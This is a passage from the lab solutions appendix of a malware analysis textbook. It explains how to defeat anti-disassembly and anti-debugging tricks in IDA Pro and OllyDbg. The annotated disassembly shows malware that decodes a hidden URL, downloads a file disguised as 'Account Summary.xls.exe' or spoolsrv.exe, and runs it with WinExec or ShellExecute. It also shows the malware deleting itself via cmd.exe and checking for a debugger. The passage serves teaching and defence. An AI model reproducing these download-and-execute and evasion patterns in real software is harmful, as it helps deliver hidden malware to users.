- en: '004012E6 loc_4012E6: ; CODE XREF: 004012ECj 004012E6 66 B8 EB 05 mov ax, 5EBh
    '
  prefs: []
  type: TYPE_NORMAL
- en: 004012EA 31 C0 xor eax, eax 004012EC 74 FA jz short near ptr loc_4012E6+2 
  prefs: []
  type: TYPE_NORMAL
- en: '004012EE E8 6A 0A 6A 00 call near ptr 0AA1D5Dh *Listing 15-6L: False conditionals
    into the middle of the previous instruction* Listing 15-6L shows an advanced countermeasure
    that involves a false conditional jump into the middle of a previous instruction
    as seen with the upward-jumping jz at . This jumps into the middle of the mov
    instruction at .'
  prefs: []
  type: TYPE_NORMAL
- en: It is impossible to have the disassembler show all the instructions that are
    executed in this case because the opcodes are used twice, so just follow the code
    logically and convert each instruction to code as you reach it.
  prefs: []
  type: TYPE_NORMAL
- en: When you are finished with this countermeasure, it should look like the code
    in Listing 15-7L. At , we see the middle of the mov instruction from the previous
    listing converted to a proper jmp instruction.
  prefs: []
  type: TYPE_NORMAL
- en: 004012E6 66 db 66h
  prefs: []
  type: TYPE_NORMAL
- en: 004012E7 B8 db 0B8h ; +
  prefs: []
  type: TYPE_NORMAL
- en: 004012E8 ; ------------------------------------------------------------
  prefs: []
  type: TYPE_NORMAL
- en: 004012E8
  prefs: []
  type: TYPE_NORMAL
- en: '004012E8 loc_4012E8: ; CODE XREF: 004012ECj **648**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004012E8 EB 05 jmp short loc_4012EF 
  prefs: []
  type: TYPE_NORMAL
- en: 004012EA ; ------------------------------------------------------------
  prefs: []
  type: TYPE_NORMAL
- en: 004012EA 31 C0 xor eax, eax 004012EC 74 FA jz short loc_4012E8
  prefs: []
  type: TYPE_NORMAL
- en: 004012EC ; ------------------------------------------------------------
  prefs: []
  type: TYPE_NORMAL
- en: 004012EE E8 db 0E8h 
  prefs: []
  type: TYPE_NORMAL
- en: 004012EF ; ------------------------------------------------------------
  prefs: []
  type: TYPE_NORMAL
- en: 004012EF
  prefs: []
  type: TYPE_NORMAL
- en: '004012EF loc_4012EF: ; CODE XREF: loc_4012E8j 004012EF 6A 0A push 0Ah'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-7L: Manually repaired anti-disassembly code* You can convert all
    the extra db bytes (like the one shown at ) to NOPs using the IDA Python **PatchByte**
    option described after Listing 15-4L. This will allow you to create a proper function
    within IDA Pro. To create a function, after patching the NOPs, select all the
    code from the retn instruction on line 0x0040130E to the beginning of the function
    at 0x00401000, and press the P key. To view the resulting function graphically,
    press the spacebar.'
  prefs: []
  type: TYPE_NORMAL
- en: The two functions (sub_4012F2 and sub_401369) immediately follow the main function.
    Each builds a string on the stack, duplicating it to the heap with strdup, and
    returns a pointer to the heap string. The malware author crafted this function
    to build the string so that it will not show up as a plaintext string in the binary,
    but will appear only in memory at runtime. The first of these two functions produces
    the string http://www.practicalmalwareanalysis.com/
  prefs: []
  type: TYPE_NORMAL
- en: bamboo.html, and the second produces the string Account Summary.xls.exe.
  prefs: []
  type: TYPE_NORMAL
- en: Having defeated all the anti-disassembly countermeasures in the main function,
    these functions should show cross-references to where they are called from the
    main function. Rename these functions buildURL and buildFilename by putting your
    cursor on the function name and pressing the N key on the keyboard.
  prefs: []
  type: TYPE_NORMAL
- en: Listing 15-8L shows the call to buildURL (our renamed function) at .
  prefs: []
  type: TYPE_NORMAL
- en: '**1 5**'
  prefs: []
  type: TYPE_NORMAL
- en: 0040115F push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401161 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401163 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401167 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0040116C call buildURL 
  prefs: []
  type: TYPE_NORMAL
- en: 0040116D push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401173 mov edx, [ebp+var_10114]
  prefs: []
  type: TYPE_NORMAL
- en: 00401174 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040117A call ds:InternetOpenUrlA 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-8L: Opening the* http://www.practicalmalwareanalysis.com/bamboo.html
    *URL*'
  prefs: []
  type: TYPE_NORMAL
- en: Reading the code further, we see that it attempts to open the *bamboo.html*
    URL returned from buildURL at  using InternetOpenUrlA. In order to determine
    the User-Agent string used by the malware when calling the InternetOpenUrlA function,
    we need to first find the InternetOpen function call and determine what data is
    passed to it. Earlier in the function, we see InternetOpenA called, as shown in
    Listing 15-9L.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**649**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040113F push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401141 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401143 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401145 push 1
  prefs: []
  type: TYPE_NORMAL
- en: 00401147 lea ecx, [ebp+name] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040114D push ecx 
  prefs: []
  type: TYPE_NORMAL
- en: 0040114E call ds:InternetOpenA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-9L: Setting up the connection via InternetOpenA* The first argument
    to InternetOpenA at  is the User-Agent string. ECX is pushed as this argument,
    and the lea instruction loads it with a pointer to a location on the stack. IDA
    Pro’s stack frame analysis has named this location name, as seen at . We must
    scroll up in the function to see where name is getting populated. Near the beginning
    of the function, shown in Listing 15-10L, we see a reference to the name location
    at .'
  prefs: []
  type: TYPE_NORMAL
- en: 00401047 push 100h ; namelen 0040104C lea eax, [ebp+name] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401052 push eax ; name
  prefs: []
  type: TYPE_NORMAL
- en: 00401053 call ds:gethostname
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-10L: Using gethostname to get the local machine’s name* The gethostname
    function will populate a buffer with the hostname of the local machine. Based
    on Listing 15-10L, you might be tempted to conclude that the User-Agent string
    will be the hostname, but you would be only partially correct. In fact, careful
    examination of the code between locations 0x00401073 and 0x0040113F (not shown
    here) reveals a loop that is responsible for modifying each letter or number within
    the hostname by incrementing it by one before using it as the User-Agent. (The
    letter and number at the end, *Z* and 9, are reset to *A* and 0.)'
  prefs: []
  type: TYPE_NORMAL
- en: Following the call to InternetOpenA and the first call to InternetOpenUrlA,
    the data (an HTML web page) is downloaded to a local buffer with a call to InternetReadFile,
    as shown in Listing 15-11L at . The buffer to contain the data is the second
    argument, which has been named automatically by IDA Pro as Str at . A few lines
    down in the function, we see the Str buffer accessed again at .
  prefs: []
  type: TYPE_NORMAL
- en: 0040118F push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401190 push 0FFFFh
  prefs: []
  type: TYPE_NORMAL
- en: 00401195 lea ecx, [ebp+Str] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040119B push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040119C mov edx, [ebp+var_10C]
  prefs: []
  type: TYPE_NORMAL
- en: 004011A2 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 004011A3 call ds:InternetReadFile 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 004011D5 push offset SubStr ; "Bamboo::"
  prefs: []
  type: TYPE_NORMAL
- en: 004011DA lea ecx, [ebp+Str] 
  prefs: []
  type: TYPE_NORMAL
- en: '**650**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004011E0 push ecx ; Str 004011E1 call ds:strstr 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-11L: Reading and parsing the downloaded HTML*'
  prefs: []
  type: TYPE_NORMAL
- en: The strstr function at  is used to find a substring within a larger string.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this case, it is finding the string Bamboo:: within the buffer Str, which
    contains all the data we retrieved from the initial URL. The code immediately
    following the strstr call is shown in Listing 15-12L.'
  prefs: []
  type: TYPE_NORMAL
- en: 004011E7 add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 004011EA mov [ebp+var_108], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004011F0 cmp [ebp+var_108], 0
  prefs: []
  type: TYPE_NORMAL
- en: 004011F7 jz loc_401306
  prefs: []
  type: TYPE_NORMAL
- en: 004011FD push offset asc_40303C ; "::"
  prefs: []
  type: TYPE_NORMAL
- en: 00401202 mov edx, [ebp+var_108]
  prefs: []
  type: TYPE_NORMAL
- en: 00401208 push edx ; Str
  prefs: []
  type: TYPE_NORMAL
- en: 00401209 call ds:strstr 
  prefs: []
  type: TYPE_NORMAL
- en: 0040120F add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 00401212 mov byte ptr [eax], 0 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 00401232 mov eax, [ebp+var_108]
  prefs: []
  type: TYPE_NORMAL
- en: 00401238 add eax, 8 
  prefs: []
  type: TYPE_NORMAL
- en: 0040123E mov [ebp+var_108], eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-12L: Parsing a string separated by Bamboo:: and ::* As you can
    see, the pointer to the string Bamboo:: found within the downloaded HTML is stored
    in var_108 at . A second call to strstr, seen at , is called to search for the
    next ::. Once two colons are found, the code at '
  prefs: []
  type: TYPE_NORMAL
- en: 'replaces the first colon with a NULL, which is designed to terminate the string
    that is contained in between Bamboo:: and ::.'
  prefs: []
  type: TYPE_NORMAL
- en: The pointer stored at var_108 is incremented by eight at . This hap-1 5
  prefs: []
  type: TYPE_NORMAL
- en: 'pens to be the exact string length of Bamboo::, which is what the pointer is
    referencing. After this operation, the pointer will reference whatever followed
    the colons. Since the code already found the trailing colons and substituted them
    with a NULL, we now have a proper NULL-terminated string for whatever was in between
    Bamboo:: and :: stored in var_108\.'
  prefs: []
  type: TYPE_NORMAL
- en: Immediately following the string-parsing code, we see var_108 used at 
  prefs: []
  type: TYPE_NORMAL
- en: in Listing 15-13L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401247 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401249 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0040124B push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0040124D push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0040124F mov ecx, [ebp+var_108] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401255 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401256 mov edx, [ebp+var_10114]
  prefs: []
  type: TYPE_NORMAL
- en: 0040125C push edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040125D call ds:InternetOpenUrlA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-13L: Opening another URL in order to download more malware* Solutions
    to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**651**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The second argument (var_108) to InternetOpenUrlA is the URL to open.
  prefs: []
  type: TYPE_NORMAL
- en: 'Therefore, the data in between the Bamboo:: and the trailing colons is intended
    to be a URL for the program to download. Analysis of the code between lines 0x0040126E
    and 0x004012E3 (not shown here), reveals that the URL opened in Listing 15-13L
    is downloaded to the file *Account Summary.xls.exe*, which is then launched by
    a call to ShellExecute on line 0x00401300\.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 15-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malicious code is initially called by overwriting the return pointer from
    the main function.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The malicious code downloads a file from a URL and launches it with WinExec.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The URL used by the program is *http://www.practicalmalwareanalysis.com/*
  prefs: []
  type: TYPE_NORMAL
- en: '*tt.html*.'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The filename used by the program is *spoolsrv.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Quickly examining this binary, it initially seems to be a process-listing tool.
    You might have also noticed a few suspicious imports, such as URLDownloadToFile
    and WinExec. If you scrolled near the bottom of the code in IDA Pro, just before
    the C runtime library code, you may have even noticed where these suspicious functions
    are called. This code does not seem to be a part of the program at all. There
    is no reference to it, and much of it isn’t even disassembled.
  prefs: []
  type: TYPE_NORMAL
- en: Scroll to the top of the main function and examine the lines of disassembly,
    as shown in Listing 15-14L.
  prefs: []
  type: TYPE_NORMAL
- en: 0040100C mov eax, 400000h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401011 or eax, 148Ch 
  prefs: []
  type: TYPE_NORMAL
- en: 00401016 mov [ebp+4], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-14L: Calculating an address and loading it on the stack* This code
    builds the value 0x0040148C by ORing 0x400000  and 0x148C '
  prefs: []
  type: TYPE_NORMAL
- en: together and storing it in EAX. The code loads that value to some location on
    the stack relative to EBP at . You can press CTRL-K to bring up a stack frame
    view of the current function to see that offset 4 points to the return address.
    By overwriting the return address, when the main function ends, the orphaned code
    at 0x0040148C will execute instead of the normal process-termination code in the
    C runtime library.
  prefs: []
  type: TYPE_NORMAL
- en: The start of the code at 0x0040148C is not identified by IDA Pro as being part
    of a function, as shown in Listing 15-15L.
  prefs: []
  type: TYPE_NORMAL
- en: '**652**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 0040148C push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 0040148D mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 0040148F push ebx
  prefs: []
  type: TYPE_NORMAL
- en: 00401490 push esi
  prefs: []
  type: TYPE_NORMAL
- en: 00401491 push edi
  prefs: []
  type: TYPE_NORMAL
- en: 00401492 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401494 jz short near ptr loc_401496+1 
  prefs: []
  type: TYPE_NORMAL
- en: 00401496
  prefs: []
  type: TYPE_NORMAL
- en: '00401496 loc_401496: ; CODE XREF: 00401494j 00401496 jmp near ptr 4054D503h
    '
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-15L: The orphaned code assembled at 0x40148C*'
  prefs: []
  type: TYPE_NORMAL
- en: This orphaned code begins as a normal function, but then we encounter an anti-disassembly
    countermeasure in the form of a false conditional at .
  prefs: []
  type: TYPE_NORMAL
- en: Here, the jz instruction will always jump. The target of the jump is 0x00401497,
    which is currently not shown in the disassembly because it is the second byte
    of a 5-byte jmp instruction shown at . Place your cursor on the jmp instruction
    at  and press the D key to turn it into data. Then place your cursor on line
    0x00401497 and press C to turn it into code.
  prefs: []
  type: TYPE_NORMAL
- en: Once 0x00401497 is disassembled correctly, the next block of code you will see
    is shown in Listing 15-16L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401497 push offset dword_4014C0
  prefs: []
  type: TYPE_NORMAL
- en: 0040149C push large dword ptr fs:0
  prefs: []
  type: TYPE_NORMAL
- en: 004014A3 mov large fs:0, esp
  prefs: []
  type: TYPE_NORMAL
- en: 004014AA xor ecx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004014AC div ecx 
  prefs: []
  type: TYPE_NORMAL
- en: 004014AE push offset aForMoreInforma ; "For more information..."
  prefs: []
  type: TYPE_NORMAL
- en: 004014B3 call printf
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-16L: Building an exception handler and triggering an exception*
    **1 5**'
  prefs: []
  type: TYPE_NORMAL
- en: The lines at  and  are placed there solely to pose as a decoy; they will never
    be executed. The first five lines of this fragment build an exception handler
    and trigger a divide-by-zero exception at . (The ECX will always be zero because
    of the xor ecx,ecx in the previous instruction.) The location handling the exception
    is 0x004014C0, as shown in Listing 15-17L.
  prefs: []
  type: TYPE_NORMAL
- en: 004014C0 dword_4014C0 dd 824648Bh, 0A164h, 8B0000h, 0A364008Bh, 0
  prefs: []
  type: TYPE_NORMAL
- en: '004014C0 ; DATA XREF: loc_401497o 004014D4 dd 0EB08C483h, 0E848C0FFh, 0'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-17L: The exception-handling code currently defined as data* IDA
    Pro did not recognize the data in Listing 15-17L as code, and has chosen instead
    to represent it as a series of DWORDs. Place your cursor on the first DWORD and
    press the C key to change this into code.'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**653**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: After successfully changing the data in Listing 15-17L to code, it is displayed
    as shown in Listing 15-18L.
  prefs: []
  type: TYPE_NORMAL
- en: 004014C0 mov esp, [esp+8]
  prefs: []
  type: TYPE_NORMAL
- en: 004014C4 mov eax, large fs:0
  prefs: []
  type: TYPE_NORMAL
- en: 004014CA mov eax, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: 004014CC mov eax, [eax]
  prefs: []
  type: TYPE_NORMAL
- en: 004014CE mov large fs:0, eax
  prefs: []
  type: TYPE_NORMAL
- en: 004014D4 add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 004014D7 jmp short near ptr loc_4014D7+1 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-18L: Properly disassembled exception-handling code* The code in
    Listing 15-18L unlinks the structured exception handler and removes the exception
    record from the stack. The last line of the code is an anti-disassembly countermeasure
    in the form of an inward-pointing jmp instruction at . Convert the jmp to data
    by placing your cursor at 0x4014D7'
  prefs: []
  type: TYPE_NORMAL
- en: and pressing the D key. Then select line 0x004014D8 and convert it to code with
    the C key.
  prefs: []
  type: TYPE_NORMAL
- en: After correcting the anti-disassembly countermeasure shown in Listing 15-18L,
    we see that the rest of the code is properly disassembled with a call to URLDownloadToFileA,
    seen at  in Listing 15-19L.
  prefs: []
  type: TYPE_NORMAL
- en: 004014E6 push offset unk_403010
  prefs: []
  type: TYPE_NORMAL
- en: 004014EB call sub_401534 
  prefs: []
  type: TYPE_NORMAL
- en: 004014F0 add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 004014F3 push offset unk_403040
  prefs: []
  type: TYPE_NORMAL
- en: 004014F8 call sub_401534 
  prefs: []
  type: TYPE_NORMAL
- en: 004014FD add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 00401500 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401502 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401504 push offset unk_403040 
  prefs: []
  type: TYPE_NORMAL
- en: 00401509 push offset unk_403010 
  prefs: []
  type: TYPE_NORMAL
- en: 0040150E push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401510 call URLDownloadToFileA 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-19L: Downloading a file from a URL*'
  prefs: []
  type: TYPE_NORMAL
- en: The second and third arguments to URLDownloadToFileA are the URL and filename,
    respectively. It seems that the global memory locations unk_403010
  prefs: []
  type: TYPE_NORMAL
- en: and unk_403040 are being used at  and , respectively. If you examine this
    memory with IDA Pro, the data does not appear to be ASCII text. These same locations
    are also passed to sub_401534 at  and . We should examine this function to see
    if it decodes this data. Careful analysis of this function (not shown here) will
    find that it takes a pointer to a buffer and modifies it in place by XOR’ing each
    byte with the value 0xFF. If we XOR the data at unk_403010, we get the strings
    http://www.practicalmalwareanalysis.com/tt.html and spoolsrv.exe for unk_403040\.
  prefs: []
  type: TYPE_NORMAL
- en: Immediately following the call to URLDownloadToFileA, we encounter one last
    anti-disassembly countermeasure, as shown in Listing 15-20L. This is a **654**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: false conditional in the form of a combination of jz and jnz together to create
    an unconditional jump, at  and .
  prefs: []
  type: TYPE_NORMAL
- en: 00401515 jz short near ptr loc_401519+1 
  prefs: []
  type: TYPE_NORMAL
- en: 00401517 jnz short near ptr loc_401519+1 
  prefs: []
  type: TYPE_NORMAL
- en: 00401519
  prefs: []
  type: TYPE_NORMAL
- en: '00401519 loc_401519: ; CODE XREF: 00401515j 00401519 ; 00401517j 00401519 call
    near ptr 40A81588h'
  prefs: []
  type: TYPE_NORMAL
- en: 0040151E xor [eax+0], al
  prefs: []
  type: TYPE_NORMAL
- en: 00401521 call ds:WinExec
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-20L: The final anti-disassembly technique encountered in the malware*
    The target of the jumps is 0x0040151A. Place your cursor on line 0x00401519 and
    press D to turn this line into data. Then select line 0x0040151A and press C to
    turn it into code. Continue this process until you are left with the code shown
    in Listing 15-21L.'
  prefs: []
  type: TYPE_NORMAL
- en: 0040151A push 0
  prefs: []
  type: TYPE_NORMAL
- en: 0040151C push offset unk_403040
  prefs: []
  type: TYPE_NORMAL
- en: 00401521 call ds:WinExec 
  prefs: []
  type: TYPE_NORMAL
- en: 00401527 push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00401529 call ds:ExitProcess
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 15-21L: Using WinExec to launch the downloaded file* The call to WinExec
    at  will launch whatever is specified by the buffer unk_403040, which will contain
    the value spoolsrv.exe. The program then terminates manually with ExitProcess.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 16-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 6**'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware checks the status of the BeingDebugged, ProcessHeap, and NTGlobalFlag
    flags to determine if it is being run in a debugger.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: If any of the malware’s anti-debugging techniques succeed, it will terminate
    and remove itself from disk.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: You can manually change the jump flags in OllyDbg during runtime, but doing
    so will get tedious since this malware checks the memory structures so frequently.
    Instead, modify the structures the malware checks in memory either manually or
    by using an OllyDbg plug-in like PhantOm or the Immunity Debugger (ImmDbg) PyCommand
    hidedebug.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: See the detailed analysis for a step-by-step way to dump and modify the structures
    in OllyDbg.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Both the OllyDbg plug-in PhantOm and the ImmDbg PyCommand hidedebug will thwart
    this malware’s checks.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**655**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 147](index-689_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: As noted in the lab description, this malware is the same as *Lab09-01.exe*,
    except with anti-debugging techniques. Therefore, a good place to start is either
    by working through Lab 9-1 or by reviewing your answers.
  prefs: []
  type: TYPE_NORMAL
- en: 'When we load this malware into OllyDbg, we see that it attempts to delete itself.
    Suspecting that something must be wrong or that this malware is significantly
    different from Lab 9-1, we load *Lab16-01.exe* into IDA Pro. As shown in Figure
    16-1L, we notice that the beginning of the main method appears suspicious because
    of several accesses of fs:[30] and calls to a function that IDA Pro identifies
    as one that doesn’t return. In fact, most functions recognized by IDA Pro have
    this suspicious start. (None of the functions in Lab 9-1 have this code.) *Figure
    16-1L: Anti-debugging checks contained at the beginning of most functions in*
    *Lab 16-1*'
  prefs: []
  type: TYPE_NORMAL
- en: We see at , , and  in Figure 16-1L that sub_401000 is called and the code
    stops there (no lines leave the boxes). Since a line doesn’t leave the box, it
    means the function probably terminates the program or doesn’t contain a ret instruction.
    Each large box in Figure 16-1L contains a check that decides whether sub_401000
    will be called or the malware will continue to execute normally. (We’ll analyze
    each of these checks after we look at sub_401000.) The function sub_401000 is
    suspicious because execution won’t return from it, so we examine it further. Listing
    16-1L shows its final instructions.
  prefs: []
  type: TYPE_NORMAL
- en: '**656**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004010CE lea eax, [ebp+Parameters]
  prefs: []
  type: TYPE_NORMAL
- en: 004010D4 push eax ; lpParameters 004010D5 push offset File ; "cmd.exe"
  prefs: []
  type: TYPE_NORMAL
- en: 004010DA push 0 ; lpOperation 004010DC push 0 ; hwnd
  prefs: []
  type: TYPE_NORMAL
- en: 004010DE call ds:ShellExecuteA 
  prefs: []
  type: TYPE_NORMAL
- en: 004010E4 push 0 ; Code
  prefs: []
  type: TYPE_NORMAL
- en: 004010E6 call _exit 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-1L: Function sub_401000 with code to terminate the malware and
    remove it* *from disk*'
  prefs: []
  type: TYPE_NORMAL
- en: Function sub_401000 ends at  with a call to _exit, terminating the malware.
    The call to ShellExecuteA at  removes the malware from disk by launching *cmd.exe*
    using the parameters /c del Lab16-01.exe. Checking the cross-references to sub_401000,
    we find 79 of them, most of which come from the anti-debugging code shown in Figure
    16-1L. Let’s dissect Figure 16-1L
  prefs: []
  type: TYPE_NORMAL
- en: in more detail.
  prefs: []
  type: TYPE_NORMAL
- en: '**The BeingDebugged Flag**'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 16-2L shows the code in the top box of Figure 16-1L.
  prefs: []
  type: TYPE_NORMAL
- en: 00403554 mov eax, large fs:30h 
  prefs: []
  type: TYPE_NORMAL
- en: 0040355A mov bl, [eax+2] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040355D mov [ebp+var_1820], bl
  prefs: []
  type: TYPE_NORMAL
- en: 00403563 movsx eax, [ebp+var_1820]
  prefs: []
  type: TYPE_NORMAL
- en: 0040356A test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040356C jz short loc_403573 
  prefs: []
  type: TYPE_NORMAL
- en: 0040356E call sub_401000
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 16-2L: Checking the BeingDebugged flag*'
  prefs: []
  type: TYPE_NORMAL
- en: As you can see, the PEB structure is loaded into EAX at  using the fs:[30]
    location, as discussed in “Manually Checking Structures” on page 353\.
  prefs: []
  type: TYPE_NORMAL
- en: At , the second byte is accessed and moved into the BL register. At , the
    **1 6**
  prefs: []
  type: TYPE_NORMAL
- en: code decides whether to call sub_401000 (the terminate and remove function)
    or to continue running the malware.
  prefs: []
  type: TYPE_NORMAL
- en: The BeingDebugged flag at offset 2 in the PEB structure is set to 1 when the
    process is running inside a debugger, but we need this flag set to 0 in order
    for the malware to run normally within a debugger. We can set this byte to 0
  prefs: []
  type: TYPE_NORMAL
- en: either manually or with an OllyDbg plug-in. Let’s do it manually first.
  prefs: []
  type: TYPE_NORMAL
- en: 'In OllyDbg, make sure you have the Command Line plug-in installed (as discussed
    in Chapter 9). To launch the plug-in, load the malware in OllyDbg and select **Plugins****Command
    Line**. In the command-line window, enter the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: dump fs:[30] + 2
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**657**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 148](index-691_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '![Image 149](index-691_2.png)'
  prefs: []
  type: TYPE_IMG
- en: This command will dump the BeingDebugged flag into the dump window.
  prefs: []
  type: TYPE_NORMAL
- en: To manually clear the BeingDebugged flag, run the dump command in the command-line
    window, as shown in the top part of Figure 16-2L. Then right-click the BeingDebugged
    flag and select **Binary****Fill With 00’s**, as shown in the bottom portion
    of Figure 16-2L. This sets the flag to 0\. With this change, the BeingDebugged
    check performed several times at the start of functions in the malware will no
    longer call the sub_401000 function.
  prefs: []
  type: TYPE_NORMAL
- en: Now let’s try the plug-in approach. The OllyDbg plug-in PhantOm ( *http://www.woodmann.com/collaborative/tools/index.php/PhantOm*)
    will protect you from many anti-debug checks used by malware. Download the plug-in
    and install it by copying it to your OllyDbg installation directory before launching
    OllyDbg. Then select **Plugins****PhantOm****Options** to open the PhantOm Options
    dialog, as shown in Figure 16-3L. Check the first option, **Hide from PEB**, to
    set the BeingDebugged flag to 0 the next time OllyDbg loads malware. (Confirm
    this by dumping the PEB structure before and after the plug-in is installed.)
